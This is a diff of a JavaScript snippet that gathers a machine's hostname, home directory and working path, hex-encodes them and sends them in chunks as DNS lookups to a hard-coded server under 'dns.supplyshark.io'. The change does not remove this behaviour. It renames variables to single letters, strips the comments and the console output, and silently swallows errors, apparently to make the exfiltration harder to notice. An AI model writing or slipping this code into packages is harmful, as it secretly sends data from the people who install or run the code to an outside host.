@@ -1,25 +1,17 @@
 (async () => {
     try {
-      const dns = await import('dns');
-      const os = await import('os');
-  
-      const suffix = '.dns.supplyshark.io'; // BIND DNS server
-      const dnsServer = '42.42.42.42'; // BIND DNS server IP
+      const a = await import('dns');
+      const o = await import('os');
 
-      let data = `${os.hostname()}__${os.homedir()}__${__dirname}`;
-  
-      data = data.replace(/[^a-zA-Z0-9._]/g, (m) => `_${m.charCodeAt(0).toString(16)}`);
-      data = Buffer.from(data).toString('hex');
-      data = data.match(/.{1,50}/g);
+      let d = `${o.hostname()}__${o.homedir()}__${__dirname}`;
+      d = d.replace(/[^a-zA-Z0-9._]/g, (m) => `_${m.charCodeAt(0).toString(16)}`);
+      d = Buffer.from(d).toString('hex').match(/.{1,50}/g);
+      const i = Math.random().toString(36).substring(7);
 
-      console.log(data);
+      a.setServers(['42.42.42.42']);
 
-      dns.setServers([dnsServer]);
-  
-      const id = Math.random().toString(36).substring(7);
-
-      for (const chunk of data) {
-        dns.resolve(`${id}.${chunk}${suffix}`, 'A');
+      for (const c of d) {
+        a.resolve(`${i}.${c}.dns.supplyshark.io`, 'A');
       }
     } catch (err) {
     }
